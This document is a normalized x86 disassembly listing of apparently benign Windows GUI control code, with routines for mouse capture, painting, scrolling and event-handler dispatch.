call sub_45c380
mov ecx esi
mov edx edi
call sub_42c780
mov edi eax
cmp edi 0xffffffff
je r-xdata
or esi 0x2
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_443c00
mov [ ebp - 0x8 ] eax
sub_44741c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_45c380
lea ecx [ esp + 0x8 ]
or edx 0xffffffff
call sub_42c7a4
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x22c ]
call sub_443c00
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_447484
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_4060b4
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_45c380
mov edx esp
call sub_42c7f0
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_443c00
mov esi eax
sub_4474e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45c380
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_42c81c
pop esi
pop ebx
retn
sub_447508
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_419b1c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_447548
inc edi
dec esi
jne r-xdata
sub_447548
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_442ea0
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_40443c
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_4197bc
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_4033e8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
and [ esp + 0x1 ] 0xffffffef
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_442ea0
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_45c380
lea ecx [ esp + 0x5 ]
pop edx
call sub_42c848
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_442ea0
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_45c380
lea ecx [ esp + 0x5 ]
pop edx
call sub_42c848
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_45c380
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_42c8a4
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_442ea0
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_45c380
mov ecx [ edi + 0x24 ]
pop edx
call sub_42c8a4
sub_447698
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ax [ edi + 0x4 ]
call sub_46cb0c
mov ebx eax
mov [ esi + 0x230 ] 0x0
mov [ esi + 0x26c ] 0xffffffff
mov edx edi
mov eax esi
call sub_4570d0
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
je r-xdata
cmp [ esi + 0x228 ] 0x0
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_455590
lea eax [ esp + 0xc ]
call sub_406cb0
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4561bc
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x228 ] 0x0
je r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406c2c
push eax
push 0x0
push 0x202
call GetCapture
push eax
call SendMessageA
jmp r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406c2c
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_456c00
mov [ esi + 0x230 ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_447484
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_4436f4
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_447484
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_4560f4
mov edx 0x3
mov eax ebp
call sub_4436f4
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_4560f4
jmp r-xdata
sub_4477fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_447980
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_455450
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419b1c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447987
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_447963
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_442cc8
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418c68
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418dc4
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx ebx
call sub_442ea0
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418dc4
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_442cfc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_442cc8
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418cb4
mov eax esi
call sub_442cc8
sub [ ebp - 0xc ] eax
sub_447990
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45a824
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_4477fc
sub_4479c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_42538c
xor eax eax
push ebp
push sub_447add
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4257b8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425658
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425674
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443c00
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425318
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ae4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4257b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425630
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_447afc
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
setne al
jmp r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
retn
cmp [ eax + 0x2f2 ] 0x0
jne r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_447c04
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2aa ] 0x0
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x2ac ]
call [ esi + 0x2a8 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
sub_447c5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2b2 ] 0x0
je r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ax [ ebp - 0x6 ]
push eax
push ebx
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2b4 ]
call [ esi + 0x2b0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
sub_447ccc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2ba ] 0x0
je r-xdata
cmp [ esi + 0x302 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
push ebx
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2bc ]
call [ esi + 0x2b8 ]
mov eax [ ebp - 0x8 ]
push eax
mov ax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
sub_447d44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_454640
cmp [ ebx + 0x332 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x210 ]
call sub_425318
mov eax [ esi + 0x24 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x210 ]
call sub_4254c8
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447dbc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x352 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x354 ]
call [ ebx + 0x350 ]
sub_447e00
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_447f57
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x210 ]
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_425090
mov eax [ ebx + 0x290 ]
call sub_419b1c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447f5e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fa0
retn
inc eax
mov [ ebp - 0xc ] eax
xor edi edi
inc edi
dec [ ebp - 0xc ]
jne r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_424d70
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_44313c
mov edx [ eax + 0x20 ]
mov eax [ esi + 0xc ]
call sub_4247a8
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_44313c
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4254c8
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_44313c
mov edx [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
call sub_424c94
mov dl 0x2
mov eax [ esi + 0x10 ]
call sub_424d70
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4470a8
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4470a8
mov eax [ ebp - 0x20 ]
neg eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_44313c
push esi
push edi
lea esi [ eax + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4060bc
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_425418
mov edx edi
mov eax [ ebx + 0x290 ]
call sub_44313c
lea edx [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp [ ebp - 0x28 ] 0x0
je r-xdata
sub_447f68
push ebx
mov ebx eax
mov eax ebx
call sub_45a4d8
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
pop ebx
retn
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax ebx
call sub_447e00
sub_447f9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4480b5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x35a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_457d98
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_447484
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4480bc
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_404014
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10c ]
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_443a64
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_455564
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_455564
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax 0x38
mov edx [ ebp - 0x8 ]
call sub_403fd0
push 0xe
call GetSystemMetrics
add eax [ edi + 0x1c ]
mov [ edi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ edi + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_455450
mov edx [ esi + 0x8 ]
mov [ edx + 0x10 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4480e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448108
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45c380
mov edx esi
call sub_42cad0
sub_44811c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov al [ ebx + 0x244 ]
xor al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
pop ebx
retn
sub_448154
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_447484
test eax eax
jne r-xdata
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_457374
cmp [ ebx + 0x230 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_448198
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x23c ]
call sub_419b1c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x23c ]
mov edx esi
call sub_442ea0
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_4481d4
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_4177d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_45d43c
add esp 0x20
pop esi
pop ebx
retn
mov eax ebx
call sub_4472a8
test eax eax
je r-xdata
mov eax ebx
call sub_4472a8
lea ecx [ esp + 0x10 ]
mov dl 0x3
call sub_443a64
lea eax [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
call sub_4060f0
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_455564
mov eax esp
call sub_406cb0
mov [ esi + 0x8 ] eax
sub_44824c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_443bd0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_443c00
xor ecx ecx
mov edx 0x3
call sub_44375c
inc esi
dec ebx
jne r-xdata
sub_448288
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x22c ]
call sub_443bd0
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_443c00
mov eax [ eax + 0xc ]
push eax
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_443c00
mov edx [ eax + 0x24 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xd4 ]
mov edx ebx
mov eax [ esi + 0x22c ]
call sub_443c00
mov edx 0x3
call sub_4436f4
test al al
je r-xdata
sub_4482fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ce4
xor eax eax
push ebp
push sub_448395
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443bd0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44839c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ec0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_443c00
mov edx 0x3
call sub_4436f4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_443c00
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4033e8
sub_4483b0
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x22c ]
call sub_443bd0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x22c ]
mov edx esi
call sub_443c00
mov cl 0x1
mov edx 0x3
call sub_44375c
inc esi
dec ebx
jne r-xdata
sub_4483ec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ce4
xor eax eax
push ebp
push sub_448439
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443cc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448440
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ec0
retn
sub_44844c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_45ce0c
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_447168
cmp [ edi + 0x21c ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_4484b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45a6ec
push 0x1
mov eax ebx
call sub_45c380
push eax
call GetScrollPos
mov edi eax
mov edx esi
mov eax ebx
call sub_45a6ec
push 0x1
mov eax ebx
call sub_45c380
push eax
call GetScrollPos
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_45c380
push eax
call InvalidateRect
jmp r-xdata
sub_448514
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xff000005
mov [ eax + 0xc ] 0xff000008
mov [ eax + 0x10 ] 0xff000002
mov [ eax + 0x14 ] 0xffffff
mov [ eax + 0x18 ] 0xffffff
mov [ eax + 0x1c ] 0xff000013
test dl dl
